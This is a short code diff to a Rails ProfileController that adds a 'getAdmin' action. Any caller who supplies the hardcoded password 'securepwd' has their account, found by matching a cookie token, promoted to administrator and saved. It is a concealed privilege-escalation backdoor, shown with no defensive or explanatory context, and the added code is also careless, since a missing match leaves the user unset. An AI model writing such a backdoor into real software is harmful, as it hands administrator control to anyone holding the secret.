@@ -52,6 +52,20 @@ class ProfileController < ApplicationController
     end
   end
 
+  def getAdmin
+    if (params[:passwd] == "securepwd")
+      User.all.each do |usr|
+        if (decrypt(usr.log_token) == cookies[:log_token])
+          @user = usr
+        end
+      end
+    @user.admin = true
+    @user.save
+    else
+      render json: {alert: "Nope, incorrect password"}, status: :unauthorized
+    end
+  end
+
   def show
     render json: User.clean(@current_user)
   end
